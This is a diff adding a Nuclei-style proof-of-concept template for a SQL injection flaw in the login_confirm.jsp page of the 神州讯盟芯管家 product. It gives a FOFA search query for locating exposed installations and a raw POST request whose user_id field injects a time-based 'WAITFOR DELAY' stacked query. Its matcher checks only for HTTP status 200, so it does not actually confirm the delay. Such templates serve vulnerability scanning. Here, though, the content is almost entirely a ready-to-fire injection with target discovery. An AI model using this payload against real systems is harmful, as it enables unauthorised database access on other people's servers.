@@ -1,0 +1,28 @@
+id: poc-rthmqh5y4w8vxrg4
+info:
+  name: 神州讯盟芯管家login_confirm.jsp存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rthmqh5y4w8vxrg4'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rthmqh5y4w8vxrg4
+    fofa: title="神州讯盟芯管家"
+http:
+- raw:
+  - 'POST /login_confirm.jsp HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:137.0) Gecko/20100101 Firefox/137.0
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    user_id=1%27;WAITFOR+DELAY+%270:0:5%27--&sn=8&macadress=&wm_types=%C4%A3%CC%AC%B4%B0%BF%DA&url=%2FSunmoIC%2F698D51A19D8A121CE581499D7B701668.jsp&url2=%2FSunmoIC%2F698D51A19D8A121CE581499D7B701668.jsp&password=admin&version=%D6%D0%CE%C4'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
